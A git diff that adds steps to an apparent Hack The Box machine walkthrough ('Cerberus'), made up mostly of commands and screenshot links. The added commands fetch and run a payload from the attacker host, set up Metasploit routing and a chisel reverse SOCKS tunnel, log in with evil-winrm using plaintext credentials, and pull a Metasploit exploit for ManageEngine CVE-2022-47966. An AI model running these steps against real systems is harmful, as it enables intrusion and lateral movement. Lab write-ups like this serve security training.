@@ -1,4 +1,4 @@
-```
+![image](https://github.com/regarmulia/HTB/assets/33616880/95578bdf-ec9f-41c4-a795-5eb68f9193d1)```
 nmap -sS -sC -sV -T5 -Pn 10.10.11.205
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/8c945ce1-850e-47d9-b545-95e5d5be3b31)
@@ -145,5 +145,103 @@ run -j
 ![image](https://github.com/regarmulia/HTB/assets/33616880/ec61ef7d-8063-406f-8719-584f42e6477c)
 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/e1e3def5-1d53-4c17-a068-22a19e6e0422)
+
+
+```
+nano /etc/proxychains4.conf
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/fc6d2901-4950-488f-9e9c-9b3bb4a3f630)
+
+
+```
+wget http://10.10.14.2:8000/shell
+./shell &
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/302a4b0f-1430-41dc-8052-c06660d0754b)
+
+
+```
+use post/multi/manage/autoroute
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/0e76bcae-fb3e-4538-9966-4f88134f240d)
+
+
+```
+proxychains evil-winrm -i 172.16.22.1 -u matthew -p 147258369
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/098498bd-c8e9-44c9-b8a5-d9c638f91b42)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/45d9133f-648b-4069-85aa-0307f783bcf2)
+
+
+```
+netstat -ano | select-string LIST
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/bfcdbe5d-933c-420f-8aec-bfa6fcc4d612)
+
+
+```
+cat /etc/hosts
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/aee0f466-efd5-4e27-b9f8-4e1f978dfe28)
+
+
+```
+git clone https://github.com/jpillora/chisel.git
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/8d2867a4-849c-4b95-87e5-274988b0c39c)
+
+
+```
+./chisel_1.9.0_linux_amd64 server --socks5 -p 6666 --reverse
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/a07718ca-c3fd-43fd-8d25-ff0d37b44b1e)
+
+
+```
+iwr('http://10.10.14.2:8000/chisel_1.9.0_windows_amd64') -outfile chisel.exe
+start-process -filepath .\chisel.exe -args "client 10.10.14.2:6666 R:8888:socks"
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/c0ccfeea-234e-4df4-aa22-0a06f8bbeaad)
+
+
+```
+nano /etc/proxychains4.conf
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/eb447332-f655-4c71-8aba-ed609456a2d5)
+
+
+```
+New SOCKS proxy
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/794c406e-f983-4efb-bba8-209f943e474a)
+
+
+```
+https://dc.cerberus.local:9251
+https://dc.cerberus.local/adfs/ls/?SAMLRequest=pVNNj9owFLz3V0S%2Bky8cEizCikJXRWLbCLI99FI5zgtrybGp7bDsv1%2BHjy2tWiq1J0v2vPfmzYwnd4dWeHvQhiuZo8gPkQeSqZrLbY4ey%2FtBhu6m7yaGtiLekVlnn%2BQavndgrDczBrR1dXMlTdeC3oDecwaP61WOnqzdGRIEizkZx0kU9A1WastlMEppVkdhNBqHOIxrNqKjFOMqa1hGU0Yjyposq%2BIGeQs3hUtqj9QuDWvmM9AV6M74QjEqAlo3JhAmQN5ykaNvuKrjCqc4TcIhhCHgJMVxQtNkNB5inEQOZkwHS2kslTZHcRgPB2E2iKMyzEiECR77KY6%2BIq%2FQyiqmxHsuT3p0WhJFDTdE0hYMsYxsZg8rEvshqU4gQz6WZTEoPm%2FKY4M9r0F%2FcugcPVBJt%2FBBOhHAmy02IJqzYl4hOoO8Lxcb4t4GZ4w05CT87dG7M080PflEjgtq717pltrbtf0NrwfNEUpAWm5ffpp9u5xeMoCm%2F%2B%2F4JLimP72ErldvuSiU4OzFmwmhnucaqHWKWt0B%2BuuakR%2F9smYnzQ4YbzjUKHibc8411MeUu1BbOFhvrtod1dz0vsCBMvum8jVsLpwSa2j%2BSbmbMEZY39tdF%2B54VrruYwnM8Sw1dYsobS%2FC%2FY7R9Pz4h%2F1%2BPF%2F%2F7ekr&RelayState=aHR0cHM6Ly9EQzo5MjUxL3NhbWxMb2dpbi9MT0dJTl9BVVRI
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/78030abe-deeb-41b7-8034-3e171fb53f57)
+
+
+```
+wget https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966.rb
+```
+
+
+```
+cd "C:\program files (x86)\manageengine\ADSelfService Plus\backup“
+download OfflineBackup_20230214064809.ezip
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/4013981f-0825-4bc6-8fd0-bff4eee746c2)
+
+
+```
+7z x OfflineBackup_20230214064809.ezip
+grep -i issuer_url *
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/b8aaa3ce-a802-41da-abaf-b9ba871c8ddc)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/c9023ba0-590d-4291-9e3a-b1ed9672e5dc)
 
 
